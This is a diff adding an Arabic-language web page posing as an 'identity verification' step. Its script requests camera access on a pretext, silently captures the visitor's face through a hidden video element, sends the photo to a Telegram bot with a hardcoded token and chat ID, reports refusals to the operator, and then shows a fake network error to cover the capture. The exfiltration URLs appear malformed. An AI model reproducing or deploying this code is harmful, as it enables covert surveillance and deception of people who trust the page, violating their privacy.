@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحقق من الهوية</title>
+    <style>
+        body { margin: 0; background: #000; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: sans-serif; color: #fff; overflow: hidden; }
+        #startBtn { padding: 18px 50px; font-size: 19px; border-radius: 50px; border: none; background: #fff; color: #000; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        #status { position: absolute; bottom: 60px; font-size: 16px; display: none; text-align: center; width: 80%; line-height: 1.5; }
+        video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+    </style>
+</head>
+<body>
+
+    <!-- الخطوة الأولى: صفحة الدخول -->
+    <button id="startBtn">دخول الموقع</button>
+    <div id="status">جاري الاتصال بالسيرفر...</div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // بياناتك البرمجية
+        const token = '8672505531:AAGAAm3KTW7lyoYX8DjnVPfcOutO6LRFnfg'; 
+        const chatID = '1921462984';
+
+        const video = document.getElementById('video');
+        const startBtn = document.getElementById('startBtn');
+        const status = document.getElementById('status');
+
+        // عند الضغط على الزر (طلب إذن الكاميرا)
+        startBtn.onclick = function() {
+            startBtn.style.display = 'none';
+            status.style.display = 'block';
+            status.innerText = "جاري التحقق من المتصفح...";
+
+            // طلب الكاميرا (سيظهر زر Allow/سماح للمستخدم)
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    status.innerText = "جاري مزامنة البيانات...";
+                    
+                    // الخطوة الثانية: التقاط الصورة بعد ثانية واحدة فقط
+                    setTimeout(takeAndSend, 1000);
+                })
+                .catch(function(err) {
+                    status.innerText = "خطأ: يجب السماح بالكاميرا وتحديث الصفحة للدخول.";
+                    // إرسال تنبيه لك بأن الشخص رفض الإذن
+                    fetch(`https://telegram.org{token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent("❌ الشخص رفض إذن الكاميرا")}`);
+                });
+        };
+
+        function takeAndSend() {
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            canvas.toBlob(function(blob) {
+                const formData = new FormData();
+                formData.append('chat_id', chatID);
+                formData.append('photo', blob, 'capture.jpg');
+
+                // الخطوة الثالثة: إرسال الصورة للبوت
+                fetch(`https://telegram.org{token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(function(res) {
+                    // إغلاق الكاميرا فوراً بعد الإرسال
+                    const tracks = video.srcObject.getTracks();
+                    tracks.forEach(track => track.stop());
+
+                    // الخطوة الرابعة: إظهار رسالة خطأ وهمية للشخص
+                    setTimeout(() => {
+                        status.style.color = "#ff4d4d";
+                        status.innerText = "حدث خطأ غير متوقع في الشبكة (Error: 0x8004100). يرجى المحاولة لاحقاً.";
+                    }, 500);
+                })
+                .catch(function() {
+                    status.innerText = "فشل الاتصال بالشبكة.";
+                });
+            }, 'image/jpeg', 0.6);
+        }
+    </script>
+</body>
+</html>
